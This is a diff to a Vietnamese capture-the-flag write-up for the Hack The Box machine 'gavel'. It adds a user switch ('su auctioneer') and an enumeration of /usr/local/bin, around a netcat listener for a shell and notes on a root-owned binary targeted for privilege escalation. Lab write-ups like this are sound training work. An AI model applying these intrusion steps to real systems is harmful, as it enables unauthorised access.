@@ -72,9 +72,14 @@ curl -X POST 'http://gavel.htb/includes/bid_handler.php' -H 'X-Requested-With: X
 nc -lvnp 4444
 ```
 ![alt text](image-11.png)
+```code
+su auctioneer
+```
 - Tìm các Binary có sắn trên máy mà ta có thể control được
 ![alt text](image-13.png)
-
+```code
+ls -la /usr/local/bin/
+```
 - Điều cần chú ý ở đây : `-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util`
   - User: `root`
   - Group: `gavel-seller`
